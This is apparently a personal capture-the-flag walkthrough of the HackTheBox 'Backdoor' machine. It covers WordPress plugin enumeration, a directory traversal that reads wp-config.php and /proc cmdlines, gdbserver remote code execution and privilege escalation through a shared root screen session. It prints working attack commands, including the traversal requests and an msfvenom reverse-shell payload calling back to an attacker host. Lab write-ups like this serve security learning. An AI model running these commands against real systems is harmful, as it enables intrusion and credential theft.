---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Backdoor

https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html

## NMAP

` nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.125`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 16:53 UTC
Nmap scan report for 10.10.11.125
Host is up (0.100s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
```

`nmap -p 22,80,1337 -sCV -oA scans/nmap-tcpscripts 10.10.11.125`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 16:55 UTC
Nmap scan report for 10.10.11.125
Host is up (0.091s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_https-redirect: ERROR: Script execution failed (use -d to debug)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.25 seconds
```

## Web

Port 80 It is a wordpress app.

### wpscan

`wpscan -e ap,t,tt,u --url http://backdoor.htb --api-token $WPSCAN_API` Nothing usefull is found. But, if it is executed in aggressive plugin scanning mode. It will give better results `wpscan -e ap --plugins-detection aggressive --url http://backdoor.htb --api-token $WPSCAN_API`

```
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:31:27 <============================================================================================================================================================================================> (97783 / 97783) 100.00% Time: 00:31:27
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:                                          

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |                       
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |                      
 | [!] 1 vulnerability identified:
 |                      
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5     
 |     References:        
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.
[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
```

### feroxbuster (alternative plugin discovery)

`feroxbuster -u http://backdoor.htb/wp-content/plugins -w plugins.txt`

### /wp-content/plugins/ (alternative plugin discovery)

If directory listing is enabled (it is), this directory gives out the information I need. But this is not really a default beahviour.

### Exploit vulnerable plugin

I need to make sure that the version is really vulnerable. See: https://www.exploit-db.com/exploits/39575 for POC.

```
# Readme with verison
curl http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
# Config with database creds
curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

```
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
...
```

But that does not help with loging in.

However, I can use the directory traversal to list processes. Because I want to know what is running hte port 1337.

```
curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- | xxd
```

I need to use the `-o- | xxd` to output and process binaty data. That is a lot of text. I can search in it, or use a script (https://ib4rz.github.io/posts/HTB-Backdoor/) to filter it.

```
#!/bin/python3

import signal
import requests
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Stopping the process...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"
empty_resp = 125

p1 = log.progress("Brute force")
p1.status("Starting brute force attack")

for pid in range(0,5000):
    p1.status("Testing pid %d" % (pid))
    content = (requests.get(main_url + str(pid) + "/cmdline")).content
    if (len(content) > empty_resp):
        print(f"[+] Process {pid} found")
        print(content)
        print("--------------------------------------------\n")
```

It will find this process: a `gdbserver`

```
/bin/sh -c while true;
    do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; 
done
```

### Exploit gdbserver

There is a guideline on exploiting it: https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver And searchsploid record.

```
└─$ searchsploit gdbserver
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                                                                                                                       | linux/remote/50539.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Poining to: `/usr/share/exploitdb/exploits/linux/remote/50539.py `  Which does say all I need

So prepare the payload:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf
```

Then I can either run it by hand, or use the prepared script.

#### By hand

Start debugging

```
kali@kali$ gdb -q rev.elf 
Reading symbols from rev.elf...
(No debugging symbols found in rev.elf)
(gdb)
```

Connect to remote

```
(gdb) target extended-remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
```

Upload binary

```
(gdb) remote put rev.elf /dev/shm/rev
Successfully sent file "rev.elf".
```

Remote debug the file

```
(gdb) set remote exec-file /dev/shm/rev
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /dev/shm/rev from remote target...
Reading /dev/shm/rev from remote target...
Reading symbols from target:/dev/shm/rev...
(No debugging symbols found in target:/dev/shm/rev)
[Detaching after fork from child process 33603]
[Inferior 1 (process 33592) exited normally]
```

Which gives me reverse shell on `443`. NOTE: I need to upgrade the shell.

With that I have USER flag

#### With metasploit

```
msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
[*] 10.10.11.125:1337 - Stepping program to find PC...
[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.10.11.125:1337 - Executing the payload...
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.11.125:58140 ) at 2022-04-20 20:38:51 +0000

id
uid=1000(user) gid=1000(user) groups=1000(user)
```

## Root

Enumerate the processes `ps auxww` There is an interesting one (it runs as a root in a loop):

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root         853  0.0  0.0   2608  1828 ?        Ss   16:43   0:05 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
...
```

```
/bin/sh -c while true;
    do sleep 1;
    find /var/run/screen/S-root/ -empty -exec screen -dmS root \;
done
```

Note: In fact the `screen` is the interesing thing. It represents an open session. It is a terminal multiplexer.

From the parementers and [man page](https://linux.die.net/man/1/screen) I can see that it is detached, and I sould be able to attach to it.

```
# You might need to set terminal: export TERM=xterm
/usr/bin/screen -x root/root
```

And I am able to do just that!

#### The misschonfiguration behind

The real catch behind the `screen` is missconfiguration. Just running the command, dosen't mean that I can just jump in. But it can be configured in [multiuser mode](https://unix.stackexchange.com/questions/163872/sharing-a-terminal-with-multiple-users-with-screen-or-otherwise/163878#163878). And that is acually the configuration in `/root/.screenrc`

```
multiuser on
acladd user
shell -/bin/bash
```